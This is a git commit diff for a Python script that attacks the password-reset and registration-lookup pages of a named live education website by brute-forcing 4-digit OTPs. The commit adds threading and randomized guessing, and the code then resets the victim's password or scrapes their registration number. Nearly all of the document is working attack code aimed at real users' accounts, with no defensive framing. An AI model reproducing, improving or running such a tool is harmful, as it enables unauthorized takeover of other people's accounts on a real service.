c761fa2b4a44c181705b9865027020835252e644
Monazir Muhammad Doha <70005698+Itsmmdoha@users.noreply.github.com>
2023-06-22 18:17:40 +0600

    Adding multi_threading
    This update brings two new features. 
    1. Now the OTP's are randomly tried across all attacks
    2. Attacks are done in multiple threads

--- assist.py
+++ assist.py
@@ -2,9 +2,14 @@ import requests as r
 from time import sleep
 from bs4 import BeautifulSoup
 
+
 session = r.Session()
 url = "https://online.udvash-unmesh.com/Account/ForgotPassword"
-res = session.get(url)
+try:
+    res = session.get(url)
+except:
+    print("You are living under a rock, move out and get an internet connection.")
+    exit()
 cookie = res.headers["set-cookie"]
 index = cookie.index(";") 
 token = cookie[0:index]
@@ -15,13 +20,10 @@ data = {
     }
 
 class ChangePassword:
-    
+    wrongOTP = True
     def __init__(self,Phone,Registration):
         self.PhoneNumber = Phone
         self.registrationNumber = Registration 
-    
-    
-     
     def req_otp(self):
         req_url = f"{url}?{token}&registrationNumber={self.registrationNumber}&mobileNumber={self.PhoneNumber}"
         session.get(req_url)
@@ -29,22 +31,17 @@ class ChangePassword:
         print("OTP sent!")
 
 
-    def crack_otp(self):
+    def tryOTP(self,otp):
         data["RegistrationNumber"] = self.registrationNumber
         data["mobileNumber"] = self.PhoneNumber
-        print("trying all 10000 combination!")
-        sleep(3)
         otp_url = "https://online.udvash-unmesh.com/Account/ForgotPassword"
-        with open("4digits.txt") as file:
-            for otp in file:
-                data["otp"] = otp[0:4]
-                print(data["otp"])
-                otp_res = session.post(otp_url,data=data)
-                if "Password length must be greater than or equal to 6" in otp_res.text:
-                    print("Cracked!!")
-                    break
-           
-               
+        data["otp"] = otp
+        print(otp)
+        otp_res = session.post(otp_url,data=data)
+        if "Password length must be greater than or equal to 6" in otp_res.text:
+            self.wrongOTP = False
+        else:
+            pass
 
 
     def changePass(self,password):
@@ -60,6 +57,7 @@ class ChangePassword:
 
 
 class getRegNumber:
+    wrongOTP = True
     def __init__(self,phone,nickName):
         self.phoneNumber = phone
         self.nickName = nickName
@@ -70,21 +68,18 @@ class getRegNumber:
         session.get(otp_url)
         print("OTP sent!")
     
-    def crack_otp(self):
-        print("Preparing Bruteforce")
-        sleep(3)
+    def tryOTP(self,otp):
         data["nickName"] = self.nickName
         data["mobileNumber"] = self.phoneNumber
         otp_url = "https://online.udvash-unmesh.com/Account/ForgotRegistrationNumber"
-        with open("4digits.txt") as file:
-            for otp in file:
-                data["otp"] = otp[0:4]
-                print(data["otp"])
-                otp_res = session.post(otp_url,data = data)
-                if "Your registration number" in otp_res.text:
-                    print("Cracked!!")
-                    soup = BeautifulSoup(otp_res.content, 'html.parser')
-                    h3_tag = soup.find('h3', {'class': 'uu-login-form-sub-title'})
-                    span_tag = h3_tag.find('span')
-                    print(f"The registration number is:{span_tag.text}")
-                    break
+        data["otp"] = otp
+        print(otp)
+        otp_res = session.post(otp_url,data = data)
+        if "Your registration number" in otp_res.text:
+            self.wrongOTP = False
+            soup = BeautifulSoup(otp_res.content, 'html.parser')
+            h3_tag = soup.find('h3', {'class': 'uu-login-form-sub-title'})
+            span_tag = h3_tag.find('span')
+            print(f"The registration number is:{span_tag.text}")
+        else:
+            pass
